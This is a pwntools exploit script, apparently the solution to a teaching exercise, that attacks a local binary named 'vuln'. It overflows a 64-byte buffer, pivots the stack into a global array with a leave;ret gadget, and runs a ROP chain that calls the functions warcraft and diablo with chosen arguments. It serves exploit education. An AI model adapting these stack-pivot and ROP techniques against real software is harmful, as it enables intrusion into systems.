#!/usr/bin/env python2

from pwn import *


# Set context according to binary.
binary = "./vuln"
context.binary = binary
#context.log_level = 'debug'


e = ELF(binary)

g_array_address = e.symbols["g_array"]
log.info("g_array at 0x{:0x}".format(g_array_address))

r = ROP(e)
leave_ret_address = r.find_gadget(["leave", "ret"]).address
pop_rdi_ret = r.find_gadget(["pop rdi", "ret"]).address
pop_rsi_r15_ret = r.find_gadget(["pop rsi", "pop r15", "ret"]).address

# Offset to return address was computed using get_offset.py.
offset = 64

# Create payload to overwrite return address with address of warcraft().
payload = offset * "A"
# We place the secondary payloat at an offset (2048) from g_array_address
# to leave room for stack allocation.
payload += pack(g_array_address + 2048) # RBP <- g_array_address
payload += pack(leave_ret_address) # RIP <- leave + ret gadget
# leave: (mov rsp, rbp) RSP <- RBP (g_array_address) ; the stack pivoting happens here (the secondary payload stored in g_array_address)
#        (pop rbp) RBP <- 8 * "B"
# ret:  whatever is on the secondary_payload

warcraft_address = e.symbols["warcraft"]
diablo_address = e.symbols["diablo"]
starcraft_puts_address = 0x40060f

# Add 2048 * "A" at the beginning of g_array for stack allocations.
secondary_payload = 2048 * "A" + 8 * "B" + \
        pack(warcraft_address) + \
        pack(starcraft_puts_address) + \
        8 * "C" + pack(pop_rdi_ret) + pack(0x12345678) + \
        pack(pop_rsi_r15_ret) + pack(0xaabbccdd) + 8 * "D" + \
        pack(diablo_address)

# Start process
io = process(binary)

# Read banner information and send secondary_payload.
msg = io.recvline()       # Read "hello, blizzard!" banner.
log.debug("banner: ", msg)
#gdb.attach(io)
io.sendline(secondary_payload)
log.debug("sent secondary payload")
io.sendline(payload)
log.debug("sent payload")

# Read "gimme message: ..." prompt + payload. The prompt isn't flushed
# by the time we send the payload, so we read it here, together with the
# payload.
io.interactive()
